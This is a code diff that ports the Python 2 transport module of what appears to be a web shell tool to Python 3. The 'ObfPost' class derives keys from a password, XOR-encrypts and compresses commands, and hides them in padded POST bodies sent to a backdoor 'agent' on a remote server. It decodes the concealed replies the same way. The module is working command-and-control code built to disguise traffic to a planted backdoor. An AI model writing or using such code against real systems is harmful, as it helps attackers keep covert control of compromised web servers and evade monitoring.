@@ -1,43 +1,49 @@
 from core.loggers import dlog
 from core import config
 import re
-import urlparse
 import random
 import utils
 import string
 import base64
-import urllib2
+from urllib import request, error, parse
 import hashlib
 import zlib
-import httplib
-import string
+import http.client
+import itertools
 
-PREPEND = utils.strings.randstr(16, charset = string.printable)
-APPEND = utils.strings.randstr(16, charset = string.printable)
+PREPEND = utils.strings.randstr(16, charset=string.printable).encode()
+APPEND = utils.strings.randstr(16, charset=string.printable).encode()
+
+
+def sxor(s1, s2):
+    seen = []
+    for a, b in zip(s1, itertools.cycle(s2)):
+        seen.append(a ^ b)
+    return bytes(seen)
+
 
 class ObfPost:
-
     def __init__(self, url, password):
+        '''
+        Generate the 8 char long main key. Is shared with the server and
+        used to check header, footer, and encrypt the payload.
+        '''
+        passwordhash = hashlib.md5(password.encode()).hexdigest().lower()
+        self.shared_key = passwordhash[:8].encode()
+        self.header = passwordhash[8:20].encode()
+        self.trailer = passwordhash[20:32].encode()
 
-        # Generate the 8 char long main key. Is shared with the server and
-        # used to check header, footer, and encrypt the payload.
-
-        passwordhash = hashlib.md5(password).hexdigest().lower()
-        self.shared_key = passwordhash[:8]
-        self.header = passwordhash[8:20]
-        self.trailer = passwordhash[20:32]
-        
         self.url = url
-        url_parsed = urlparse.urlparse(url)
+        url_parsed = parse.urlparse(url)
         self.url_base = '%s://%s' % (url_parsed.scheme, url_parsed.netloc)
 
         # init regexp for the returning data
         self.re_response = re.compile(
-            "%s(.*)%s" % (self.header, self.trailer), re.DOTALL
-            )
+            b"%s(.*)%s" % (self.header, self.trailer),
+            re.DOTALL)
         self.re_debug = re.compile(
-            "%sDEBUG(.*?)%sDEBUG" % (self.header, self.trailer), re.DOTALL
-            )
+            b"%sDEBUG(.*?)%sDEBUG" % (self.header, self.trailer),
+            re.DOTALL)
 
         # Load agent
         # TODO: add this to the other channels
@@ -48,17 +54,16 @@ class ObfPost:
         # Init additional headers list
         self.additional_headers = config.additional_headers
 
-
-    def send(self, original_payload, additional_handlers = []):
+    def send(self, original_payload, additional_handlers=[]):
 
         obfuscated_payload = base64.b64encode(
-            utils.strings.sxor(
-                zlib.compress(original_payload),
-                self.shared_key)).rstrip('=')
+            sxor(
+                zlib.compress(original_payload.encode()),
+                self.shared_key)).rstrip(b'=')
 
         wrapped_payload = PREPEND + self.header + obfuscated_payload + self.trailer + APPEND
 
-        opener = urllib2.build_opener(*additional_handlers)
+        opener = request.build_opener(*additional_handlers)
 
         additional_ua = ''
         for h in self.additional_headers:
@@ -81,10 +86,12 @@ class ObfPost:
         )
 
         try:
-            response = opener.open(url, data = wrapped_payload).read()
-        except httplib.BadStatusLine as e:
+            response = opener.open(url, data=wrapped_payload).read()
+        except http.client.BadStatusLine as e:
             # TODO: add this check to the other channels
-            log.warn('Connection closed unexpectedly, aborting command.')
+            print((repr(e)))
+            # log.warn('Connection closed unexpectedly, aborting command.')
+            print('Connection closed unexpectedly, aborting command.')
             return
 
         if not response:
@@ -96,10 +103,9 @@ class ObfPost:
             dlog.debug('\n'.join(matched_debug))
 
         matched = self.re_response.search(response)
-    
+
+        import binascii
         if matched and matched.group(1):
-            return zlib.decompress(
-                utils.strings.sxor(
-                    base64.b64decode(
-                        matched.group(1)),
-                    self.shared_key))
+            b64data = base64.b64decode(matched.group(1))
+            zcomp = sxor(b64data, self.shared_key)
+            return zlib.decompress(zcomp)
